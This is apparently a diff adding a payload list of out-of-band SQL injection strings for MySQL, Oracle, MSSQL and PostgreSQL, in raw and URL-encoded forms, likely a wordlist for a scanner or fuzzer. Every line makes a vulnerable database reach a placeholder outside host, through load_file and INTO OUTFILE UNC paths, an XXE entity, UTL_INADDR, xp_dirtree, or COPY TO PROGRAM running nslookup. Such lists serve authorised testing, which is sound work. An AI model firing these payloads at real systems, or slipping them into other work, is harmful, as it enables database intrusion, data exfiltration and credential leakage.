@@ -1,0 +1,24 @@
+(select load_file('\\\\[host]\\ljw'))=1
+1'+(select load_file('\\\\[host]\\lze'))+'=1
+1 into outfile '\\\\[host]\\rfy'; -- =1
+(select%20load_file('%5c%5c%5c%5c[host]%5c%5cljw'))=1
+1'%2b(select%20load_file('%5c%5c%5c%5[host]%5c%5clze'))%2b'=1
+1%20into%20outfile%20'%5c%5c%5c%5c[host]%5c%5crfy'%3b%20--%20=1
+/(select%20load_file('%5c%5c%5c%5c[host]%5c%5cwko'))
+/(select load_file('\\\\[host]\\wko'))
+/1'%2b(select%20load_file('%5c%5c%5c%5c[host]%5c%5cqze'))%2b'
+/1'+(select load_file('\\\\[host]\\qze'))+'
+/1'+(select load_file('\\\\[host]\\qze'))+'
+/1 into outfile '\\\\[host]\\rvi'; --
+(select%20load_file('%5c%5c%5c%5cf[host]%5c%5cwko'))
+/(select load_file('\\\\f[host]\\wko'))
+'%2b(select%20load_file('%5c%5c%5c%5c[host]%5c%5cqze'))%2b'
+/1'+(select load_file('\\\\[host]\\qze'))+'
+'+(select load_file('\\\\[host]\\qze'))+'
+/1 into outfile '\\\\[host]\\rvi'; --
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://[host]/"> %remote;]>'),'/l') FROM dual
+SELECT UTL_INADDR.get_host_address('[host]')
+exec master..xp_dirtree '//[host]/a'
+copy (SELECT '') to program 'nslookup [host]'
+LOAD_FILE('\\\\[host]\\a')
+SELECT ... INTO OUTFILE '\\\\[host]\a'
